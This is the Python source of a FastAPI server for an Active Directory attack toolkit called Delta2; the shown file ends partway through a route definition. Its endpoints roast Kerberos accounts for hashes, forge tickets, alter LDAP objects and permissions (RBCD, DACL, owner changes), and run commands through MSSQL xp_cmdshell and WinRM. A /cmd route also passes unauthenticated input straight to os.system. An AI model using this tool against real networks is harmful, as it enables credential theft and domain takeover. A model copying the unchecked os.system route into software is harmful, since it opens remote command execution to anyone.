import random
import string
import sys, os
from neo4j import GraphDatabase
import argparse
from delta2.colors import colors
import markdown
import markdown.extensions.fenced_code
from delta2.scripts.collector import Data_collection # Data collection
from delta2.scripts.utils.tickets import TGS_no_preauth # Kerberoast with no preauth and asrep roast
from fastapi import FastAPI, BackgroundTasks, UploadFile, HTTPException, Request
from delta2.scripts.clients.mssql import MSSQL_Client
from delta2.scripts.clients.smb import SMB as SMB_CLIENT
from delta2.scripts.clients.winrm import WINRM
from pydantic import BaseModel
from typing import Optional, List
import uvicorn
from argparse import Namespace
from base64 import b64encode
from delta2.ascii import random_art


DEFAULT_QUERY = "MATCH (n) return n"

tags_metadata = [
        {"name": "kerberos",
        "description": "test or exploit kerberos authentication protocol."},
        {"name": "Memgraph",
        "description": "query memgraph database to find possible paths"},
        {"name": "config",
        "description": "configure delta2 and memgraph"},
        {
                "name": "ldap",
                "description": "routes for ldap"
        },
        {
                "name": "other",
                "description": "Other"
        },
        {
                "name": "mssql",
                "description": "routes for mssql"
        },
        {
                "name": "smb",
                "description": "routes for smb"
        },
        {
                "name": "certs",
                "description": "routes for AD CS "
        }
]

from fastapi import Response
docs_file = "docs.md"
app = FastAPI(title="Delta2", openapi_tags=tags_metadata)
art = f"""
{colors.GREEN}                           ....iilll
{colors.GREEN}                 ....iilllllllllllll
{colors.RED}     ....iillll  {colors.GREEN}lllllllllllllllllll
{colors.RED} iillllllllllll  {colors.GREEN}lllllllllllllllllll
{colors.RED} llllllllllllll  {colors.GREEN}lllllllllllllllllll
{colors.RED} llllllllllllll  {colors.GREEN}lllllllllllllllllll
{colors.RED} llllllllllllll  {colors.GREEN}lllllllllllllllllll
{colors.RED} llllllllllllll  {colors.GREEN}lllllllllllllllllll
{colors.RED} llllllllllllll  {colors.GREEN}lllllllllllllllllll
 
{colors.BLUE} llllllllllllll  {colors.YELLOW}lllllllllllllllllll
{colors.BLUE} llllllllllllll  {colors.YELLOW}lllllllllllllllllll
{colors.BLUE} llllllllllllll  {colors.YELLOW}lllllllllllllllllll
{colors.BLUE} llllllllllllll  {colors.YELLOW}lllllllllllllllllll
{colors.BLUE} llllllllllllll  {colors.YELLOW}lllllllllllllllllll
{colors.BLUE} `^^^^^^lllllll  {colors.YELLOW}lllllllllllllllllll
{colors.BLUE}       ````^^^^  {colors.YELLOW}^^lllllllllllllllll
{colors.BLUE}                 {colors.YELLOW}     ````^^^^^^llll {colors.RESET}
"""
global name
global uri
name = "memgraph"
uri = "bolt://127.0.0.1:7687"
client = GraphDatabase.driver(uri=uri, database=name)

class Dbconfig(BaseModel):
    name: str = "memgraph"
    uri: str = "bolt://localhost:7687"
class Query(BaseModel):
        query:str = DEFAULT_QUERY


class CMD(BaseModel):
        command: str

class Target(BaseModel):
        domain: str
        dc: str
        kerberos: str = "False"
        ldap_ssl: Optional[str] = "False"
        user_name: str = ""
        dc_ip: str = ""

class Kerberos(BaseModel):
        """
        Authentication class, can be used for other things than kerberos authentication.
        """
        password: str = ""
        user_hash: str = ":"
        aeskey: str = ""
        get_hash: str = "False"
        kdcHost: str = ""

class Roast(BaseModel):
        target_user: str
        no_preauth: Optional[str] = "False"






client = "nothing"
def config_driver(DB_name, DB_uri):
        global client
        client = GraphDatabase.driver(uri=DB_uri, database=DB_name)
        return client

# app = Flask(__name__) # app variable for running flask
# #  test comment
# @app.route('/')
# def hello():
#         return render_template('index.html')
import json
from fastapi.responses import JSONResponse
import socket
@app.post("/config", tags=['config'])
async def config(conf:Dbconfig):
        """
        configure the database, 0 if database is configured properly, and will return error if otherwise
        """
        try:
                name = conf.name
                uri = conf.uri
                if name == None or name == "string":
                        name = "memgraph"
                if uri == None or uri == "string":
                        uri = "bolt://localhost:7687"
                print(name)
                print(uri)
                config_driver(DB_name=name, DB_uri=uri)
                records, summary, keys =  client.execute_query(DEFAULT_QUERY)
                data = "0"
        except Exception as e:
                try:
                        uri = f'bolt://{socket.gethostbyname(uri.replace("bolt://", ""))}'
                        print(uri)
                        config_driver(DB_name=name, DB_uri=uri)
                        records, summary, keys =  client.execute_query(DEFAULT_QUERY)
                        data = "0"
                except Exception as e:
                        None
                        print(e)
                        data = str(e)
        return data

import os, subprocess, time
@app.post("/cmd", tags=['config'])
def cmd(command: CMD):
        """ Help configure the container and execute remote commands """
        os.remove("cmd.log")
        command = command.command
        os.system(f'{command} > cmd.log')
        time.sleep(4)
        cmd_output = open('cmd.log', 'r').read()
        print(cmd_output)

        return Response(cmd_output)
        







@app.get("/", tags=['other'])
def ascii():
        """ Grab some cool ascii art """
        return Response(content=random_art(), media_type="text/plain")


from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
import markdown
from markdown_it import MarkdownIt
md = MarkdownIt()

@app.get("/documentation", tags=['other'],response_class=HTMLResponse)
def documentation(request: Request):
        """ Get documentation read in firefox's "reader" """
        data = open("./api.md", 'r').read()
        html = md.render(data)
        return HTMLResponse(content=html)





""" Kerberos """

from delta2.scripts.utils import tickets
@app.post("/kerberos/asrep", tags=["kerberos"])
async def asreproast(target: Target, kerb: Kerberos):
        """
        Asrep roast users or get users that don't require preauth,
        json format goes as follows: `{"user": user, "asrep_data": hash, exception, or "Vulnerable"}`
        if get_hash is "True" it will return hash in `asrep_data` if the user is asrep roastable,
        if it is false then it will return "Vulnerable" in `asrep_data`,
        if the user is not vulnerable it will return an empty string in `asrep_data`,
        Only requires the target user `user_name`, DC `dc`, domain `domain`, specifying `dc_ip` is recommended.
        """
        domain = target.domain
        dc = target.dc
        user_name = target.user_name
        get_hash = kerb.get_hash
        dc_ip = target.dc_ip
        print(get_hash)
        e = "nil"
        tgt = tickets.TGT(domain=domain, dc=dc, username=user_name, dc_ip=dc_ip)
        try:
                h  = tgt.run(user_name)
        except Exception as a:
                e = a
                h = 'Nil'
        if e != "nil":

                data = {'user': user_name, "asrep_data": f'error occurred: {str(e)}'}
        else:
                if get_hash == True or get_hash == "True":
                        data = {'user': user_name, "asrep_data": h}
                if get_hash == False or get_hash == "False":
                        data = {'user':user_name, "asrep_data": "Vulnerable"}

        return JSONResponse(data)



@app.post("/kerberos/kerbroast", tags=['kerberos'])
# target_user: str, no_preauth: str="True"
async def kerbroast(target: Target, kerb: Kerberos, roast: Roast):
        """
        kerberoast users, 
        also supports using a user that requires no preauthentication to kerberoast another user
        """
        domain = target.domain
        dc = target.dc
        target_user = roast.target_user
        no_preauth = roast.no_preauth
        # target_user = target_user
        # preauth = no_preauth
        user = target.user_name
        dc_ip = target.dc_ip
        password = kerb.password
        ntlm = kerb.user_hash
        get_hash = kerb.get_hash
        lm = ntlm.split(":")[0]
        nt = ntlm.split(":")[-1]
        e =  "nil"
        aeskey = kerb.aeskey
        #print(get_hash)
        if no_preauth == "True":
                no_preauth = True
        else:
                no_preauth = False
        try:
                tgs = TGS_no_preauth(domain=domain, dc=dc, username=target_user, password=password, nthash=nt, lmhash=lm, aeskey=aeskey, no_preauth=no_preauth, dc_ip=dc_ip)
                h = tgs.run(nopreauth_user=user)
                print(h)
        except Exception as a:
                print(traceback.format_exc())
                print(a)
                e = a
        if e != "nil":

                data = {'user': target_user, "kerb_data": f'error: {str(e)}'}
        else:
                if get_hash == True or get_hash == "True":
                        data = {'user': target_user, "kerb_data": h}
                if get_hash == False or get_hash == "False":
                        data = {'user':target_user, "kerb_data": "Vulnerable"}

        return JSONResponse(data)
import traceback

@app.post("/kerberos/tgt", tags=["kerberos"])
def tgt(target: Target, kerb: Kerberos, roast: Roast):
        """
        Grab a TGT for a user, output is a base64 encoded ccache file data
        """
        domain = target.domain
        dc = target.dc
        no_preauth = roast.no_preauth
        user = target.user_name
        dc_ip = target.dc_ip
        password = kerb.password
        ntlm = kerb.user_hash
        lm = ntlm.split(":")[0]
        nt = ntlm.split(":")[-1]
        e =  "nil"
        aeskey = kerb.aeskey
        if no_preauth == "True":
                no_preauth = True
        else:
                no_preauth = False
        tgt = tickets.GetTGT(domain=domain, username=user, dc=dc, dc_ip=dc_ip, password=password, nthash=nt, lmhash=lm, aeskey=aeskey, no_preauth=no_preauth)
        try:
                h = tgt.run()
        except Exception as a:
                print(traceback.format_exc())
                e = a
        if e != "nil":
                data = {"user": user, "tgt_data": f'error: {e}', 'file_name': tgt.f_name + '.ccache'}
                
        else:
                h = tgt.save(save=True)
                data = {"user": user, "tgt_data": h, 'file_name': tgt.f_name + '.ccache'}
        return data

@app.post('/kerberos/tgs', tags=['kerberos'])
def tgs(target: Target, kerb: Kerberos, roast: Roast):
        """ Grabs TGSs """
        domain = target.domain
        dc = target.dc
        user = target.user_name
        dc_ip = target.dc_ip
        password = kerb.password
        target_user = roast.target_user
        if target_user == "string" or target_user is None:
                target_user = user
        if roast.no_preauth == "True":
                no_preauth = True
        else:
                no_preauth = False
        ntlm = kerb.user_hash
        lm = ntlm.split(":")[0]
        nt = ntlm.split(":")[-1]
        e =  "nil"
        aeskey = kerb.aeskey
        tgs = tickets.TGS(domain=domain, dc=dc, username=user, password=password, nthash=nt, lmhash=lm, aeskey=aeskey, no_preauth=no_preauth, dc_ip=dc_ip)
        try:
                h = tgs.run(target_user=target_user, save=True)
        except Exception as a:
                print(traceback.format_exc())
                e = a
        if e != "nil":
                data = {"user": target_user, "tgs_data": f'error: {e}', 'file_name': tgs.f_name  + '.ccache'}
                
        else:
                # h = tgs.save(save=False)
                data = {"user": target_user, "tgs_data": h , 'file_name': tgs.f_name + '.ccache'}
        return data



from delta2.scripts.utils.tickets import ST
from impacket.krb5.ccache import CCache
import base64
class ST_DATA(BaseModel):
        spn: str = ""
        u2u: str = ""
        no_s4u2proxy: str = ""


from impacket.krb5.kerberosv5 import getKerberosTGT, Principal, constants, unhexlify
@app.post("/kerberos/st", tags=['kerberos'])
def st(target: Target, kerb: Kerberos, roast: Roast, st_data: ST_DATA):
        """
        Grabs ST for a target user
        """
        domain = target.domain
        dc = target.dc
        user = target.user_name
        dc_ip = target.dc_ip
        password = kerb.password
        target_user = roast.target_user
        if target_user == "string" or target_user is None:
                target_user = user
        if roast.no_preauth == "True":
                no_preauth = True
        else:
                no_preauth = False
        ntlm = kerb.user_hash
        lm = ntlm.split(":")[0]
        nt = ntlm.split(":")[-1]
        e =  "nil"
        a = None
        aeskey = kerb.aeskey
        if st_data.u2u == "":
                st_data.u2u = None
        if st_data.no_s4u2proxy == "":
                st_data.no_s4u2proxy = None
        try:
                userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(clientName = userName,
                                                                password = password,
                                                                domain = domain,
                                                                lmhash = unhexlify(lm),
                                                                nthash = unhexlify(nt),
                                                                aesKey = aeskey,
                                                                kdcHost = dc_ip)
                st = ST(domain=domain, dc=dc, username=user, tgt=tgt, cipher=cipher, spn=st_data.spn, 
                        sessionKey=sessionKey, oldSessionKey=oldSessionKey, password=password, nthash=nt, 
                        lmhash=lm, aeskey=aeskey, dc_ip=dc_ip)
                try:
                        data = st.run(target_user=target_user, no_s4u2proxy=st_data.no_s4u2proxy, u2u=st_data.u2u)
                except Exception as a:
                        print(traceback.format_exc())
                        e = a
                        data = f'error: {str(a)}'
        except Exception as a:
                print(traceback.format_exc())
                e = a
                data = f'error: {str(a)}'
        return {"target": target_user, 'ST': data, 'file_name': st.f_name + '.ccache'}





class Get_file(BaseModel):
        file_name: str


from fastapi.responses import FileResponse
@app.post('/kerberos/download_ticket', tags=['kerberos'])
def download(get_file: Get_file):
        """ Download the ticket """
        return FileResponse(get_file.file_name)


from base64 import b64decode


class Tickets_editor(BaseModel):
        b64_encoded_ticket: str = ""
        spn: str = ""
        user_sid: str= ""
        target_user: str = ""
        groups: str = "513, 512, 520, 518, 519"
        user_id: str= "500"
        impersonate: str=""
        request_ticket: str="true"

from uuid import uuid4
from delta2.scripts.impacket_examples.ticker import TICKETER


class OPTIONS(argparse.Namespace):
        def __setattr__(self, name, value):
                if isinstance(value, str) and not value:
                        value = None
                super().__setattr__(name, value)




@app.post("/kerberos/ticket_editor", tags=['kerberos'])
def ticket_editor(tickets: Tickets_editor, target: Target, kerb: Kerberos):
        """ Ticket editor, takes in the base64 encoded ticket, most code was copied from impacket's ticketer.py """
        fname = f'{str(uuid4())}.ccache'
        tmp_file = open(fname, 'wb').write(b64decode(tickets.b64_encoded_ticket))
        os.system(f"export KRB5CCNAME='./{fname}'")
        target_user = tickets.target_user
        domain = target.domain
        dc = target.dc
        user = target.user_name
        dc_ip = target.dc_ip
        password = kerb.password
        ntlm = kerb.user_hash
        lm = ntlm.split(":")[0]
        nt = ntlm.split(":")[-1]
        spn = tickets.spn
        groups = tickets.groups
        sid = tickets.user_sid
        target_id = tickets.user_id
        request_ticket = tickets.request_ticket
        if request_ticket == "true":
                request_ticket = True
        else:
                request_ticket = False


        options = OPTIONS(
    target=target_user,  # Set default values or leave them as None
    spn=spn,
    request=request_ticket,
    domain=domain,
    domain_sid=sid,
    aesKey=kerb.aeskey,
    nthash=nt,
    keytab=None,
    groups=groups,
    user_id=target_id,
    extra_sid=None,
    extra_pac=False,
    old_pac=False,
    duration='87600',
    ts=False,
    debug=False,
    user=user,
    password=password,
    hashes=ntlm,
    dc_ip=dc_ip,
    impersonate=tickets.impersonate
)
        tick = TICKETER(target=target_user, password=password, domain=domain, options=options)
        try:
                ticket_data = tick.run()
        except Exception as e:
                print(traceback.format_exc())
                ticket_data = str(e)
        return {'response': ticket_data}





from threading import Thread

from delta2.scripts.collector_new import Data_collection as NEW_Data_collection
""" Ldap Routes """
@app.post("/ldap/collect", tags=['ldap'])
async def collect(target: Target, kerb: Kerberos):
        """
        Collector class, will take a while to run if the dataset is large
        """
        domain = target.domain
        username = target.user_name
        password = kerb.password
        dc = target.dc
        dc_ip = target.dc_ip
        db_location = uri
        db_name = name
        ntlm = kerb.user_hash
        kdcHost = kerb.kdcHost
        lm = ntlm.split(":")[0]
        nt = ntlm.split(":")[-1]
        e =  "nil"
        aeskey = kerb.aeskey
        kerberos_auth = target.kerberos
        ldap_ssl = target.ldap_ssl
        aeskey = aeskey.encode()
        if kerberos_auth == "False":
                kerberos_auth = None
        else:
                kerberos_auth = True
        if ldap_ssl == "False":
                ldap_ssl = False
        else:
                ldap_ssl = True
        try:
                collector = Data_collection(domain=domain, password=password, 
        user_name=username,dc=dc, lmhash=lm,nthash=nt, kerberos=kerberos_auth, 
        database_uri=uri,ldap_ssl=ldap_ssl, kdcHost=kdcHost, dc_ip=dc_ip)
                dns = collector.search_forests()
                # dns.append(collector.root)
                if len(dns) == 0:
                        try:
                                collector.users()
                                collector.groups()
                                collector.OUs()
                                collector.connect_OUs()
                                collector.route_ACEs()
                                collector.ReadGMSAPassword()
                                collector.route_others()
                                return {"response": 0}
                        except Exception as e:
                                print(traceback.format_exc())
                                print(e)

                for dn in dns:
                        try:
                                host = dn['uri'].replace("ldap://", "")
                                host = host.replace("ldaps://", "")
                                print(host)
                                basedn = dn['baseDN']
                                collector.root = basedn
                                collector.domain = host
                                #print("collecting users")
                                collector.users()
                                #print("collecting groups..")
                                collector.groups()
                                #print("collecting OUs")
                                collector.OUs()
                                #print("connecting OUs")
                                collector.connect_OUs()
                                #print("routing ACEs")
                                collector.route_ACEs()
                                #print("Finding GMSAPassword abuse")
                                collector.ReadGMSAPassword()
                                print("routing others..")
                                collector.route_others()
                        except Exception as e:
                                # # print(dn)
                                # print(traceback.format_exc())
                                # print(e)
                                # print(dn)
                                None
                return {"response": 0}
                
        except Exception as a:
                e = a
                print(traceback.format_exc())
                return {"response": str(e)}
        

# class editor(BaseModel):
#         option: str= ""
#         computer_name: str = ""
#         computer_pass: str= ""
#         target_obj: str= ""
#         new_pass: str = ""
#         oldpass: str = ""
#         group: str = ""
#         ou: str=""
#         container: str=""
#         service: str=""
#         property_modify: str=""
#         source_account: str=""

# from delta2.scripts.objeditor import Objeditor
# import ast
# @app.post("/ldap/objeditor", tags=['ldap'])
# def editobj(target: Target, kerb: Kerberos, ops: editor):
#         """ Object editor options are: add_computer, add_member, edit_pass, delete_group_member, delete, add_rbcd """
#         domain = target.domain
#         username = target.user_name
#         password = kerb.password
#         dc = target.dc
#         dc_ip = target.dc_ip
#         db_location = uri
#         db_name = name
#         ntlm = kerb.user_hash
#         source_account = ops.source_account
#         lm = ntlm.split(":")[0]
#         nt = ntlm.split(":")[-1]

#         e =  "nil"
#         aeskey = kerb.aeskey
#         kerberos_auth = target.kerberos
#         ldap_ssl = target.ldap_ssl
#         if kerberos_auth == "False":
#                 kerberos_auth = False
#         else:
#                 kerberos_auth = True
#         if ldap_ssl == "False":
#                 scheme = "ldap"
#         else:
#                 scheme = "ldaps"
        
#         objeditor = Objeditor(username=username, dc=dc, domain=domain, dc_ip=dc_ip, 
#                         scheme=scheme, password=password, lmhash=lm, nthash=nt, 
#                         kerberos=kerberos_auth, aeskey=aeskey)
#         action = ops.option
#         methods = [method for method in dir(objeditor) if callable(getattr(objeditor, method))]
        


#         computer_name = ops.computer_name
#         computer_pass = ops.computer_pass
#         target_obj = ops.target_obj
#         new_pass = ops.new_pass
#         old_pass = ops.oldpass
#         group = ops.group
#         ou = ops.ou
#         container = ops.container
#         service = ops.service


#         if action not in methods:
#                 return {"response": f"error: action '{action}' not in Objeditor class!"}
#         try:
#                 if action == "add_computer":
#                         data = objeditor.add_computer(computername=computer_name, computerpass=computer_pass, container=container, ou=ou)
#                 if action == "add_member":
#                         data = objeditor.add_member(group=group, member=target_obj)
#                 if action == "edit_pass":
#                         if old_pass == "":
#                                 old_pass = None
#                         data = objeditor.edit_pass(target_user=target_obj, newpass=new_pass, oldpass=old_pass)
#                 if action == "delete_group_member":
#                         data = objeditor.delete_group_member(member=target_obj, group=group)
#                 if action == "delete":
#                         data = objeditor.delete(obj=target_obj)
                
#                 if action == "add_genericall":
#                         data = objeditor.add_genericall(source_account=source_account, target=target_obj)

#                 if action == "add_rbcd":
#                         data = objeditor.add_rbcd(target=target_obj, service=service)

#                 if action == "edit_obj":
#                         property_modify = ast.literal_eval(ops.property_modify)
#                         data = objeditor.edit_obj(obj_name=target_obj, property_=property_modify)


#                 return {"response": data}

#         except Exception as a:
#                 print(traceback.format_exc())
#                 e = a
#                 return {"response": f"error: {e}"}

class editor(BaseModel):
    option: str = ""
    computer_name: str = ""
    computer_pass: str = ""
    target_obj: str = ""
    new_pass: str = ""
    group: str = ""
    ou: str = ""
    service: str = ""
    property_modify: str = ""
    source_account: str = ""

from delta2.scripts.new_editor import Objeditor
import ast

@app.post("/ldap/objeditor", tags=['ldap'])
def editobj(target: Target, kerb: Kerberos, ops: editor):
    """ Object editor options are: add_object, add_member, edit_obj, delete, dacl_edit, owner, add_rbcd """
    domain = target.domain
    username = target.user_name
    password = kerb.password
    dc = target.dc
    dc_ip = target.dc_ip
    ntlm = kerb.user_hash
    source_account = ops.source_account
    lm = ntlm.split(":")[0]
    nt = ntlm.split(":")[-1]
    right = list(ast.literal_eval(ops.property_modify).keys())[0]

    aeskey = kerb.aeskey
    kerberos_auth = target.kerberos
    ldap_ssl = target.ldap_ssl
    kerberos_auth = kerberos_auth.lower() == "true"
    scheme = "ldaps" if ldap_ssl.lower() == "true" else "ldap"
    
    objeditor = Objeditor(username=username, dc=dc, domain=domain, dc_ip=dc_ip, 
                          scheme=scheme, password=password, lmhash=lm, nthash=nt, 
                          kerberos=kerberos_auth, aeskey=aeskey)
    
    action = ops.option
    methods = [method for method in dir(objeditor) if callable(getattr(objeditor, method))]

    computer_name = ops.computer_name
    computer_pass = ops.computer_pass
    target_obj = ops.target_obj
    new_pass = ops.new_pass
    group = ops.group
    ou = ops.ou
    service = ops.service

    if action not in methods:
        return {"response": f"error: action '{action}' not in Objeditor class!"}
    
    try:
        if action == "add_object":
            object_type = "computer" if computer_name else "user"
            name = computer_name if computer_name else target_obj
            pass_to_use = computer_pass if computer_pass else new_pass
            data = objeditor.add_object(object_type=object_type, name=name, ou=ou, new_pass=pass_to_use)
        elif action == "add_member":
            data = objeditor.add_member(group=group, member=target_obj)
        elif action == "edit_obj":
            property_modify = ast.literal_eval(ops.property_modify)
            data = objeditor.edit_obj(obj_name=target_obj, property_=property_modify)
        elif action == "delete":
            data = objeditor.delete(obj=target_obj)
        elif action == "dacl_edit":
            data = objeditor.dacl_edit(source_account=source_account, target=target_obj, right=right)
            
        elif action == "owner":
            data = objeditor.owner(target=target_obj, owner=source_account)
        elif action == "add_rbcd":
            data = objeditor.add_rbcd(target=target_obj, service=service)
        elif action == "edit_pass":
                data = objeditor.edit_pass(obj_name=target_obj, new_pass=new_pass)
        else:
            return {"response": f"error: action '{action}' not implemented in the API!"}

        return {"response": data}

    except Exception as e:
        print(traceback.format_exc())
        return {"response": f"error: {str(e)}"}

class UpdateOBJ(BaseModel):
        target_object: str
        obj_type: str


# TODO: Add route for updating nodes on graph..
@app.post("/ldap/update_graph", tags=["ldap"])
async def update_graph(target: Target, kerb: Kerberos, update: UpdateOBJ):
        """ Update an object on the graph by searching with ldap, obj_types  include: 
            "user", 
            "group", 
            "OU", 
            "ReadGMSAPassword", taget_object must be the DN for the object! """
        domain = target.domain
        username = target.user_name
        password = kerb.password
        dc = target.dc
        dc_ip = target.dc_ip
        db_location = uri
        db_name = name
        ntlm = kerb.user_hash
        kdcHost = kerb.kdcHost
        lm = ntlm.split(":")[0]
        nt = ntlm.split(":")[-1]
        e =  "nil"
        aeskey = kerb.aeskey
        kerberos_auth = target.kerberos
        ldap_ssl = target.ldap_ssl
        aeskey = aeskey.encode()
        if kerberos_auth == "False":
                kerberos_auth = None
        else:
                kerberos_auth = True
        if ldap_ssl == "False":
                ldap_ssl = False
        else:
                ldap_ssl = True
        try:
                collector = Data_collection(domain=domain, password=password, 
        user_name=username,dc=dc, lmhash=lm,nthash=nt, kerberos=kerberos_auth, 
        database_uri=uri,ldap_ssl=ldap_ssl, kdcHost=kdcHost, dc_ip=dc_ip)
                collector.update_node(target_object_DN=update.target_object, obj_type=update.obj_type)
        except Exception as e:
                print(traceback.format_exc())
                return {"response": str(e)}
        



class MSSQL(BaseModel):
        target_ip: str
        domain: str
        user_name: str
        password: str=''
        kerberos: str = "False"
        aeskey: str=''
        dc: str=''
        dc_ip: str=''
        kdcHost: str=''
        DB: str = ""
        nthash: str=''
        lmhash: str=""
        windows_auth: str = "False"
        query: str = ""



class XP(BaseModel):
        op: str = "xp_cmdshell"
        command: str = ""



""" MSSQL """
@app.post("/mssql/query", tags=['mssql'])
async def mssql_query(q:MSSQL):
        """
        Run mssql query on target
        """
        target_ip = q.target_ip
        domain = q.domain
        user_name = q.user_name
        password = q.password
        kerberos = q.kerberos
        aeskey = q.aeskey
        dc = q.dc
        dc_ip = q.dc_ip
        kdcHost = q.kdcHost
        DB = q.DB
        nthash = q.nthash
        lmhash = q.lmhash
        windows_auth = q.windows_auth
        query = q.query
        if kerberos == "False":
                kerberos = False
        else:
                kerberos = True
        if windows_auth == "False":
                windows_auth = False
        else:
                windows_auth = True

        mssql = MSSQL_Client(target_ip=target_ip,domain=domain,user_name=user_name,password=password,kerberos=kerberos,aeskey=aeskey,dc=dc,dc_ip=dc_ip,kdcHost=kdcHost,DB=DB,nthash=nthash,lmhash=lmhash,windows_auth=windows_auth)
        try:
                data = mssql.query(query)
                return {"response": data}
        except Exception as a:
                print(traceback.format_exc())
                e = a
                return {"response": f"error: {e}"}
        finally:
                mssql.close()

import inspect


def get_class_methods(cls):
    methods = {}
    for name, member in inspect.getmembers(cls):
        if inspect.isfunction(member) or inspect.ismethod(member):
            methods[name] = member
    return methods


@app.post("/mssql/xp", tags=['mssql'])
async def mssql_xp(xp:XP, q: MSSQL):
        """
        Execute xp_cmdshell, xp_dirtree, xp_fileexist, xp_regread, xp_regenumvalues, or xp_regenumkey commands on target
        """
        target_ip = q.target_ip
        domain = q.domain
        user_name = q.user_name
        password = q.password
        kerberos = q.kerberos
        aeskey = q.aeskey
        dc = q.dc
        dc_ip = q.dc_ip
        kdcHost = q.kdcHost
        DB = q.DB
        nthash = q.nthash
        lmhash = q.lmhash
        windows_auth = q.windows_auth
        query = q.query
        xp_op = xp.op
        command = xp.command
        if kerberos == "False":
                kerberos = False
        else:
                kerberos = True
        if windows_auth == "False":
                windows_auth = False
        else:
                windows_auth = True
        mssql = MSSQL_Client(target_ip=target_ip,domain=domain,user_name=user_name,password=password,kerberos=kerberos,aeskey=aeskey,dc=dc,dc_ip=dc_ip,kdcHost=kdcHost,DB=DB,nthash=nthash,lmhash=lmhash,windows_auth=windows_auth)
        try:
                data = get_class_methods(mssql)[xp_op](command)
                
                return {"response": data}
        except Exception as e:
                print(traceback.format_exc())
                e = e
                return {"response": f"error: {e}"}
        finally:
                mssql.close()

""" SMB """
class SMB(BaseModel):
        target_ip: str
        share: str
        path: str

@app.post("/smb/list_shares", tags=["smb"])  # TODO: Test code
async def shares(smb_model: SMB, target: Target, auth: Kerberos):
        """ list SMB shares """
        kerberos_auth = target.kerberos
        lm = auth.user_hash.split(":")[0]
        nt = auth.user_hash.split(":")[-1]
        if kerberos_auth == "False":
                kerberos_auth = False
        else:
                kerberos_auth = True
        
        try:
                smb_conn = SMB_CLIENT(target_ip=smb_model.target_ip,domain=target.domain, user_name=target.user_name, password=auth.password, lmhash=lm,nthash=nt, kerberos=kerberos_auth, kdcHost=target.dc_ip, aeskey=auth.aeskey, dc_ip=target.dc_ip, dc=target.dc)
                known_shares = smb_conn.list_shares()
                return {"response": known_shares}
        except Exception as e:
                return {"response":e}


@app.post("/smb/get_file_contents", tags=['smb']) # TODO: Test code
async def get_file(smb_model: SMB, target: Target, auth: Kerberos):
        """ Get file contents from SMB returns as base64 encoded to prevent errors """
        kerberos_auth = target.kerberos
        lm = auth.user_hash.split(":")[0]
        nt = auth.user_hash.split(":")[-1]
        share = smb_model.share
        path = smb_model.path
        if kerberos_auth == "False":
                kerberos_auth = False
        else:
                kerberos_auth = True
        
        try:
                smb_conn = SMB_CLIENT(target_ip=smb_model.target_ip,domain=target.domain, user_name=target.user_name, password=auth.password, lmhash=lm,nthash=nt, kerberos=kerberos_auth, kdcHost=target.dc_ip, aeskey=auth.aeskey, dc_ip=target.dc_ip, dc=target.dc)
                file_contents = smb_conn.get_file_contents(share=share,path=path)
                encoded_contents = base64.b64encode(file_contents).decode()
                return {"response": encoded_contents}
        except Exception as e:
                return {"response":e}

@app.post("/smb/list_dirs", tags=['smb']) # TODO: Test code
async def get_dirs(smb_model: SMB, target: Target, auth: Kerberos):
        """ Get directories in an SMB share """
        kerberos_auth = target.kerberos
        lm = auth.user_hash.split(":")[0]
        nt = auth.user_hash.split(":")[-1]
        share = smb_model.share
        path = smb_model.path
        if kerberos_auth == "False":
                kerberos_auth = False
        else:
                kerberos_auth = True
        
        try:
                smb_conn = SMB_CLIENT(target_ip=smb_model.target_ip,domain=target.domain, user_name=target.user_name, password=auth.password, lmhash=lm,nthash=nt, kerberos=kerberos_auth, kdcHost=target.dc_ip, aeskey=auth.aeskey, dc_ip=target.dc_ip, dc=target.dc)
                dirs = smb_conn.list_dirs(share=share, path=path)
                return {"response": dirs}
        except Exception as e:
                return {"response":e}



class Winrm(BaseModel):
        target_ip: str
        command: str
        ssl: str = "false"

""" Winrm """
@app.post("/winrm/cmd", tags=['winrm']) # TODO: Test code
async def get_dirs(winrm_model: Winrm, target: Target, auth: Kerberos):
        """ Get directories in an SMB share """
        kerberos_auth = target.kerberos
        lm = auth.user_hash.split(":")[0]
        nt = auth.user_hash.split(":")[-1]
        target_ip = winrm_model.target_ip
        command = winrm_model.command
        if kerberos_auth == "False":
                kerberos_auth = False
        else:
                kerberos_auth = True
        if winrm_model.ssl == "true":
                ssl = True
        else:
                ssl = False
        try:
                winrm_conn = WINRM(target_ip=winrm_model.target_ip,domain=target.domain, user_name=target.user_name, password=auth.password, lmhash=lm,nthash=nt, kerberos=kerberos_auth, kdcHost=target.dc_ip, aeskey=auth.aeskey, dc_ip=target.dc_ip, dc=target.dc, ssl=ssl)
                output = winrm_conn.command(command)
                return {"response": output}
        except Exception as e:
                return {"response": e}












""" Memgraph querying """

@app.post("/graphing/query", tags=["Memgraph"])
async def query(q:Query):
        """
        returns json response from entering query 
        """
        query = q.query
        if query == None or query == "string":
                query = DEFAULT_QUERY
        records, summary, keys = client.execute_query(query)
        data = []
        for record in records:
                record = record.data()
                data.append(record)
        data = JSONResponse(data)
        return data

@app.get("/graphing/admin_paths", tags=["Memgraph"])
async def admin_paths():
        """
        grabs shortest paths to admins
        """
        query = """
MATCH path1=(n {t: "user"})-[ *ALLSHORTEST (r, n | 1)]->(m {adminCount: "1"}) WHERE m.disabled is null and n.disabled is null and n.pwned = "True"
MATCH path2=(a {t: "computer"})-[ *ALLSHORTEST (b, c | 1)]->(d {adminCount: "1"}) WHERE d.disabled is null and a.disabled is null
RETURN path1,path2
        """
        records, summary, keys = client.execute_query(query)
        data = []
        for record in records:
                record = record.data()
                data.append(record)
        data = JSONResponse(data)
        return data

@app.get("/graphing/kerberoastable", tags=['Memgraph'])
async def get_kerberoastable():
        """
        Grabs kerberoastable users and returns them as json with their attributes
        """
        query = """
        MATCH (n) WHERE n.kerberoastable = "True"
        RETURN n
        """
        records, summary, keys = client.execute_query(query)
        data = []
        for record in records:
                record = record.data()
                data.append(record)
        data = JSONResponse(data)
        return data


@app.get("/graphing/asreproastable", tags=["Memgraph"])
async def get_asreproastable():
        """
        Grabs asreproastable users and returns their attributes
        """
        query = """
        MATCH (n) WHERE n.asreproast = "True"
        RETURN n
        """
        records, summary, keys = client.execute_query(query)
        data = []
        for record in records:
                record = record.data()
                data.append(record)
        data = JSONResponse(data)
        return data

class Pwned(BaseModel):
        obj: str = ""
        password: str = ""



@app.post("/graphing/pwned", tags=['Memgraph'])
